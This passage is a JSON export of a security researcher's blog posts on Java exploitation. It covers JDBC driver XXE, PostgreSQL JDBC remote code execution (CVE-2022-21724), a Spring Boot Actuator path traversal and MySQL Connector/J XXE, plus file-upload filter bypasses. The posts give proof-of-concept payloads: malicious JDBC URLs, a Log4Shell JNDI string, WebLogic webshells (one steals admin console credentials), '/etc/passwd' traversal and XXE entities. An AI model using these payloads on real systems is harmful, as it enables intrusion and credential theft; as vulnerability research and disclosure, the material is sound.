find that it is default to HTTP protocol . Enter the FabricConnection method, In this case, you can see that it uses the XMLRPC Client. Continuing to step into it, we find that it finally makes an XMLRPC call in the errorSafeCall Method and we can specify host and port of this call. So it looks like we’ve got an SSRF vulnerability, but it’s not enough. Similar to the MySQL deserialization vulnerability, we go on seeing if the Fabric MySQL driver had made any errors during processing the revieved data. It is clearly visible in the code that it use the newSAXParser method of the SAXParserFactory directly to get a SAXParser, where the SAXParserFactory does not set any security attributes, is an obvious XXE vulnerability, which finally can cause an arbitity file reading or SSRF attack. So the idea of attack is very clear. We construct a specific JDBC URL to enter the processing logic of Farbic Driver, set the Host and Port in the JDBC URL to our malicious HTTP server and when the client establishes a connection, it will send an XMLRPC request to the server. We control the HTTP server to return a malicious XML document ,and then XXE vulnerability will be triggered when the client processes this XML Documnet. We can read the corresponding files from the client by using the out-of-band XML External Entity attack. The connection code of the client is shown in the figure. We can trigger the XXE vulnerability without any parameters. The malicious HTTP service code is shown as follows.To constrocut the mailicious XML Documnet is easy. ConclusionWe have researched on JDBC attacks of the diverse main stream databases for a couple of weeks.Making the JDBC URLs customized will carry a big risk.It is recommended that if you have to make JDBC URLs customized, you should strictly restrict the JDBC URLs either properties or protocols.","categories":[],"tags":[],"author":"pyn3rd"},{"title":"Make JDBC Attacks Brilliant Again II","slug":"Make-JDBC-Attacks-Brilliant-Again","date":"2022-06-02T02:57:00.000Z","updated":"2022-10-12T03:04:30.909Z","comments":true,"path":"2022/06/02/Make-JDBC-Attacks-Brilliant-Again/","link":"","permalink":"http://yoursite.com/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/","excerpt":"","text":"0x01 ForewordsI made a presentation about JDBC attack interface at HITB Singapore security conference in 2021. The title of this talk is &lt;Make JDBC Attacks Brilliant Again&gt; , if you are interested, the slide link is as follow https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf However PostgreSQL database was not included in that presentation, and recently JDBC attacks in PostgreSQL database is mentioned. So I make a capsule write-up , I consider it is the exta chapter of &lt;Make JDBC Attacks Brilliant Again&gt;. 0x02 PostgreSQL JDBC Driver Remote Code Execution（CVE-2022-21724）Just like other JDBC drivers, PostgreSQL JDBC driver is on supportive of many properties. Let me start with the pair of properties in CVE-2022-21724 a. socketFactory / socketFactoryArg Official document introduction As always, debug and figure out the internal function calling procedure, here, my PostgreSQL driver version is 42.3.1, I write the following code in order to print version. 1System.out.println(&quot;PostgreSQL Driver Version: &quot; + org.postgresql.Driver.class.getPackage().getImplementationVersion()); Set the property empty and execute the code, it throws exceptions. Refer to the exceptions, set tne breakpoint at getSocketFactory() Then step into ObjectFactory.instantiate() According to this, we figure out socketFactory is used to initialize objects and there is only one string type argument of the constructor. Therefore we only need to look for an eligible class, it reminds me of the couple of classes as follow org.springframework.context.support.ClassPathXmlApplicationContext org.springframework.context.support.FileSystemXmlApplicationContext We can load the following XML file by one of the above classes 123456789101112131415&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt; &lt;constructor-arg &gt; &lt;list&gt; &lt;value&gt;open&lt;/value&gt; &lt;value&gt;-a&lt;/value&gt; &lt;value&gt;calculator&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt; &lt;/beans&gt; Start a ftp server python3 -m pyftpdlib -d . Check the result Maybe it also reminds someone of another class, like java.io.FileOutputStream. Utilize the class and ../../ to archive traveral path and empty an file arbitrarily. In my illustation, I create an empty file named test.log. b. sslFactory / sslFactoryArg Official document introduction Actually, they are as similar as socketFactory/socketFactoryArg, only a little differencs, the couple of properties are utilized to judge whether it is an encrypted connection with a SSL handshake.About SSL handshake judgement, we can figure out if the recieved request starting with big letter S after establishing connection, it is on supportive of SSL protocol. Then step into SSLSocketFactory() Next step, focus on SSLSocketFactory From here on, the code logic is the same as before.To avoid repetition, it’s not described in this article.Consequently we only give a response with big letter S after establishing connection, it will be trigged successfully. c. Weblogic Server Remote Code Execution I mentioned this class org.springframework.context.support.FileSystemXmlApplicationContext in the above illustration.But in Weblogic Server, there is a similar class com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext Pay attention to check these two jar files as follow They are both necessary, fortunately built-in by default. Finnally construct the PoC 1jdbc:postgresql://127.0.0.1:5432/testdb?&amp;socketFactory=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&amp;socketFactoryArg=ftp://127.0.0.1:2121/bean.xml Check the result 0x03 PostgreSQL JDBC Driver arbitrary file writea. loggerLevel / loggerFile Official document introduction So PoC can be contructed like this jdbc:postgresql://localhost:5432/testdb?loggerLevel=TRACE&amp;loggerFile=pgjdbc.log b. Log4Shell Logger Injection Apparently even though the database connection is failed, all the logs will be written into the specific log file. In order to pollute the log file, we can insert Log4Shell payload into JDBC connection URL. 1jdbc:postgresql://localhost:5432/$&#123;jndi:ldap://127.0.0.1:1389/eajmgl&#125;?loggerLevel=TRACE&amp;loggerFile=pgjdbc.log When using Apache Log4j2 library to read polluted log file, RCE will be triggered. c. Weblogic Server Concise Webshell In order to check the result easily, I use another property ApplicationName. Honestly it’s not necessary. Try to create a Webshell with a line of concise JSP code. The target directory is../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/ The preliminary payload seems like this 1jdbc:postgresql://127.0.0.1:5432/testdb?ApplicationName=&lt;%Runtime.getRuntime().exec(&quot;open -a calculator&quot;)&#125;;%&gt;&amp;loggerLevel=TRACE&amp;loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/she11.jsp Unfortunately it throws exceptions directly, Weblogic Server will decode %Ru (% and the next two characters Ru) with URLDecoder() method,the exception is as follow 1Could not establish a connection because of java.lang.IllegalArgumentException: URLDecoder: Illegal hex characters in escape (%) pattern - For input string: &quot;Ru&quot;&lt;br/&gt; Suddenly Expression Language comes to my mind, it can replace JSP to avoid decoding % exceptionally. By the way, Servlet &lt;=2.3 is not supportive of Expression Language by default.It’s necessary to make sure the Weblogic Server built-in Servlet version. In my illustration, Weblogic Server14 with its built-in Servlet 4.0. Servlet &gt; 2.3 is supportive of Expression Language by default. Everything is ready. The final PoC like this 1jdbc:postgresql://127.0.0.1:5432/testdb?ApplicationName=$&#123;Runtime.getRuntime().exec(&quot;open -a calculator&quot;)&#125;&amp;loggerLevel=TRACE&amp;loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/calc.jsp Access Webshell URL, then the calculator pops up. d. Weblogic Server Console Password Stealing Webshell In the above illustration, I replace JSP with Expression Language successfully, but Expression Language is limited, for example, value cannot be assigned to a variable. As we know,the Expression Language defines a set of implicit objects,like pageContext, it’s pretty useful. When instantiating the class javax.servlet.jsp.PageContext, we create an object pageContext, it represnets the entire JSP page. Set attribute with pageContext.setAttribute() method and get attribute with pageContext.getAttribute(). If the page scope is not appointed，the order will be page → request → session → application. Page scope is the default, and the pageContext object belongs to page scope. If you know about the above acknowledge, using Java reflection can achieve the desired effect. So the final PoC like this 1jdbc:postgresql://127.0.0.1:5432/testdb?ApplicationName=$&#123;pageContext.setAttribute(&quot;classLoader&quot;,Thread.currentThread().getContextClassLoader());pageContext.setAttribute(&quot;httpDataTransferHandler&quot;,pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.deploy.service.datatransferhandlers.HttpDataTransferHandler&quot;));pageContext.setAttribute(&quot;managementService&quot;, pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.management.provider.ManagementService&quot;));pageContext.setAttribute(&quot;authenticatedSubject&quot;,pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.security.acl.internal.AuthenticatedSubject&quot;));pageContext.setAttribute(&quot;propertyService&quot;,pageContext.getAttribute(&quot;classLoader&quot;).loadClass(&quot;weblogic.management.provider.PropertyService&quot;));pageContext.setAttribute(&quot;KERNE_ID&quot;,pageContext.getAttribute(&quot;httpDataTransferHandler&quot;).getDeclaredField(&quot;KERNE_ID&quot;));pageContext.getAttribute(&quot;KERNE_ID&quot;).setAccessible(true);pageContext.setAttribute(&quot;getPropertyService&quot;,managementService.getMethod(&quot;getPropertyService&quot;,pageContext.getAttribute(&quot;authenticatedSubject&quot;)));pageContext.getAttribute(&quot;getPropertyService&quot;).setAccessible(true);pageContext.setAttribute(&quot;prop&quot;,pageContext.getAttribute(&quot;getPropertyService&quot;).invoke(null,pageContext.getAttribute(&quot;KERNE_ID&quot;).get((null))));pageContext.setAttribute(&quot;getTimestamp1&quot;,propertyService.getMethod(&quot;getTimestamp1&quot;));pageContext.getAttribute(&quot;getTimestamp1&quot;).setAccessible(true);pageContext.setAttribute(&quot;getTimestamp2&quot;,propertyService.getMethod(&quot;getTimestamp2&quot;));pageContext.getAttribute(&quot;getTimestamp2&quot;).setAccessible(true);pageContext.setAttribute(&quot;username&quot;, pageContext.getAttribute(&quot;getTimestamp1&quot;).invoke(pageContext.getAttribute(&quot;prop&quot;)));pageContext.setAttribute(&quot;password&quot;,pageContext.getAttribute(&quot;getTimestamp2&quot;).invoke(pageContext.getAttribute(&quot;prop&quot;)));pageContext.getAttribute(&quot;username&quot;).concat(&quot;/&quot;).concat(pageContext.getAttribute(&quot;password&quot;))&#125;&amp;loggerLevel=TRACE&amp;loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/passwd.jsp At last, access the Webshell which we create. Steal the username and password successfully, they are log-in credentials of Weblogic Server administration console. 0x04 ConclusionJDBC is widely used because of the Java language.So the attack interface of JDBC makes a great impact. One scenario is cloud computing platform, the users can configure their JDBC connections of a cloud database service.The other scenario is authorization bypass weakness in Java frameworks.Both the scenarios make JDBC connection URL controllable easily. I summarize my research as a write-up and hope someone insterested with the attack interface will follow my research and keep on making JDBC attacks brilliant again!","categories":[],"tags":[],"author":"pyn3rd"},{"title":"Arbitrary File Upload Tricks In Java ","slug":"Arbitrary-File-Upload-Tricks-In-Java","date":"2022-05-07T04:05:00.000Z","updated":"2022-06-21T02:01:39.257Z","comments":true,"path":"2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/","link":"","permalink":"http://yoursite.com/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/","excerpt":"","text":"0x01 ForewordsRecently I see some discussions about arbitrary file upload in Java environment on Internet. The main takling points are how to bypass file name detection when uploading arbitrary file. Consequently I write this article to summerize the tricks. 0x02 Juicy Tricks Use getSubmittedFileName method to obtain file name When we use original Servlet to develop a multipart format file upload feature in Java, getSubmittedFileName() method is often utilized to obtain the file name, especially in early Java applications. But a potential problem involving this method. We can debug the code to analyse it.Firstly set the breakpoint at getSubmittedFileName , then step into the next method named HttpParser.unquote(), here is the place which file name is obtained. During debugging the code, we can find that when file name containing \\ , it will be omitted. Finally the file name becomes pyn3rd.jsp So we can use this peculiarity to evade file name detection，like regular expression based WAF. Significantly, we also can use one single &quot; in filename parameter value with one characters appended to file extension and one \\ in filename. Use getOriginalFilename method to obtain file name As we know, the scenario of multipart format file upload in SpringBoot, we are used to utilize getOriginalFilename() method to obtain file name,it can obtain file name directly without any file name changes. However, when we use another method named StringUtils.cleanPath() to normalize the file name which getOriginalFilename() method obtains, another peculiarity existing. We can use one or more /. to append the file name. / is used as a delimiter and . means the current directory. If it points to current directory,just drop it. So the result of the file name is pyn3rd.jsp By the way, in Java (Windows system), \\ is always transformed to /, when we encounter SSRF/XXE vulnerablities, trying to replace \\ with /, for example, http:\\/ replaces http:// Use Apache commons-fileupload/commons-io method to obtain file name We can also use some common Java libraries like org.apache.commons.fileupload.FileItem.getName or org.apache.commons.io.FilenameUtils.getName to obtain file name. For example,commons-io is analyzed as follow If / or /[SPACE] is appended at the end of the file name. In the other words, / with zero character or null character, the results of the file name are both pyn3rd.jsp If / or /[SPACE] is appended at the end of the file name.In case of the non-blank characters existing behind the delimiter /,the characters behind / will be obtained as the file name. 0x03 ConclusionThe different normalization results depend on the implements of varied jar libraries and the personal habbits of developers. If the developers don’t know about this, potential vulnerablities seem inevitable. Thus, the in-depth research of normalization diversities will help us evade defense.","categories":[],"tags":[],"author":"pyn3rd"},{"title":"CVE-2021-21234 Spring Boot Actuator Logview Directory Traversal","slug":"CVE-2021-21234-Spring-Boot-Actuator-Logview-Directory-Traversal","date":"2021-10-25T06:28:19.000Z","updated":"2021-10-25T08:20:53.316Z","comments":true,"path":"2021/10/25/CVE-2021-21234-Spring-Boot-Actuator-Logview-Directory-Traversal/","link":"","permalink":"http://yoursite.com/2021/10/25/CVE-2021-21234-Spring-Boot-Actuator-Logview-Directory-Traversal/","excerpt":"","text":"AbstractPrior to spring-boot-actuator-logview 0.2.13, the securityCheck() method exists in LogViewEndpoint, but the securityCheck() method only filter the .. in fileName, ignoring the security check of basePath, so the attacker can construct payload with the evasion of check in basePath. ReviewStart up tomcat server of SpringBoot project, if the page looks like this, it means SpringBoot Actutor Logview works well. Set break piont at securityCheck() meanwhile sending a HTTP request with the PoC http://localhost:8887/manage/log/view?filename=/etc/passwd&amp;base=../../../../../, then you will step into the screenshot as follow Firstly step into lggingPath() Then step into streamContent,here you can see spring.log/../../../../../ as folder, and /etc/passwd is the file we want to read. Next step into toFile() method , the folder spring.log/../../../../../ and the file /etc/passwd will be concated as the final path without secrity check any more. Consequently you can retreive the content of file /etc/passwd Proof of Concepthttp://localhost:8887/manage/log/view?filename=/etc/passwd&amp;base=../../../../../ FixFrom spring-boot-actuator-logview 0.2.13, basePath has strict security check, the path traversal is not permitted any more. Referencehttps://github.com/lukashinsch/spring-boot-actuator-logview/commit/760acbb939a8d1f7d1a7dfcd51ca848eea04e772","categories":[],"tags":[],"author":"pyn3rd"},{"title":"CVE-2021-2471 MySQL JDBC Connector XXE","slug":"mysql-jdbc-xxe","date":"2021-10-22T06:33:00.000Z","updated":"2022-06-04T01:04:40.518Z","comments":true,"path":"2021/10/22/mysql-jdbc-xxe/","link":"","permalink":"http://yoursite.com/2021/10/22/mysql-jdbc-xxe/","excerpt":"","text":"AbstractPrior to MySQL Connector/J 8.0.27, the getSource() method exists in MysqlSQLXML, but the getSource() method has no security check when external general entities included in XML sources, consequently, here exists a XXE vulnerability. ReviewSet break piont at the getSource() method, according to the source code, if the class is DOMSource , DocumentBuilder will be utilized to parse the XML source data. Unfortunately, there is no any security check when a new instance created. So we can construct a XML with external entities. However, from MySQL Connector/J 8.0.27, security attributes are set up to check XML sources before the object instantiated. Proof of Concept1234567891011import com.mysql.cj.jdbc.MysqlSQLXML;import javax.xml.transform.dom.DOMSource;import java.sql.SQLException;public class MySQLDemo &#123; public static void main(String[] args) throws SQLException &#123; MysqlSQLXML myXML = new MysqlSQLXML(null); myXML.setString(&quot;&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM \\&quot;http://127.0.0.1:8000/test.dtd\\&quot;&gt; %xxe;]&gt;&quot;); myXML.getSource(DOMSource.class); &#125;&#125; FixIn line with good XML practices, the getSource() method of MysqlSQLXML no longer supports external DTD, external general entities, and external general parameters in XML sources. Timeline 2021/07/10 Report to Oracle 2021/07/23 Fix the issue 2021/10/19 Credit and assign CVE number 2021/10/19 Release MySQL Connector/J 8.0.27 Referencehttps://www.oracle.com/security-alerts/cpuoct2021.htmlhttps://dev.mysql.com/doc/relnotes/connector-j/8.0/en/news-8-0-27.htmlhttps://github.com/mysql/mysql-connector-j/commits/4993d5735fd84a46e7d949ad1bcaa0e9bb039824/src/main/user-impl/java/com/mysql/cj/jdbc/MysqlSQLXML.java","categories":[],"tags":[],"author":"pyn3rd"}],"categories":[],"tags":[]}